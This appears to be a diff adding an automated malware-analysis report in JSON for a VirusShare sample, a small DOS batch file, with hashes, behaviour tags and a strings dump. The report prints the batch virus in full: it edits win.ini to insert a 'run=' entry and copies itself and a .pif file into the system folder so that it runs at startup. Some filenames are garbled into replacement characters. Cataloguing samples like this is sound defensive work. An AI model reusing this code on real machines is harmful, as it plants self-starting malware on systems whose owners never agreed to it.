@@ -1,0 +1,57 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "SYSTEM": "May run an executable file or a system command on a Mac",
+            "run": "May run an executable file or a system command",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "@echo off\ncls\nif exist \ufffd\ufffd.bat if exist \ufffd\ufffd\ufffd.bat if exist \ufffd$\ufffd.pif if exist win.old goto 1\n:2\nexit\n:1\ncopy /b %q%\\win.ini .\\win.ini\nfind /i \"[windows]\"<win.ini>\ufffdmp1\nfind /i \"load=\"<win.ini>\ufffdmp2\nfind /i \"run=\"<win.ini>\ufffdmp3\nfind /i \"NullPort=\"<win.ini>\ufffdmp4\nfind /i \"device=\"<win.ini>\ufffdmp5\nfind /i /v \"[windows]\"<win.ini>0t0\nfind /i /v \"load=\"<0t0>0t1\nfind /i /v \"run=\"<0t1>0t2\nfind /i /v \"NullPort=\"<0t2>0t3\nfind /i /v \"device=\"<0t3>win.ini\necho run=%q%\\SYSTEM\\%susdem%.BAT>\ufffdmp3\ncopy /b \ufffdmp1+\ufffdmp2+\ufffdmp3+\ufffdmp4+\ufffdmp5+win.ini\ndel win.ini\ncopy /b \ufffdmp1 %q%\\win.ini\ndel \ufffdmp?\ndel 0t?\ncopy /b \ufffd\ufffd\ufffd.bat %q%\\system\\%susdem%.BAT\ncopy /b \ufffd$\ufffd.pif %q%\\system\\%susdem%.pif\n:3"
+    },
+    "filename": "VirusShare_b45809eb3a8f1c5f4c3a33bd95b74eea",
+    "filesize": 675,
+    "filetype": "DOS batch file, Non-ISO extended-ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "b45809eb3a8f1c5f4c3a33bd95b74eea",
+        "sha1": "0a6c53838ae0307f24da1120a2954b75a2f8d4b1",
+        "sha256": "033be4da1d6f57cf9a49f776ed8b06ecc4a86cb657e23b84ff836cdf4a24cac2"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "if exist .bat if exist .bat if exist $.pif if exist win.old goto 1",
+            "exit",
+            "copy /b %q%\\win.ini .\\win.ini",
+            "find /i \"[windows]\"<win.ini>mp1",
+            "find /i \"load=\"<win.ini>mp2",
+            "find /i \"run=\"<win.ini>mp3",
+            "find /i \"NullPort=\"<win.ini>mp4",
+            "find /i \"device=\"<win.ini>mp5",
+            "find /i /v \"[windows]\"<win.ini>0t0",
+            "find /i /v \"load=\"<0t0>0t1",
+            "find /i /v \"run=\"<0t1>0t2",
+            "find /i /v \"NullPort=\"<0t2>0t3",
+            "find /i /v \"device=\"<0t3>win.ini",
+            "echo run=%q%\\SYSTEM\\%susdem%.BAT>mp3",
+            "copy /b mp1+mp2+mp3+mp4+mp5+win.ini",
+            "del win.ini",
+            "copy /b mp1 %q%\\win.ini",
+            "del mp?",
+            "del 0t?",
+            "copy /b .bat %q%\\system\\%susdem%.BAT",
+            "copy /b $.pif %q%\\system\\%susdem%.pif"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.262497",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
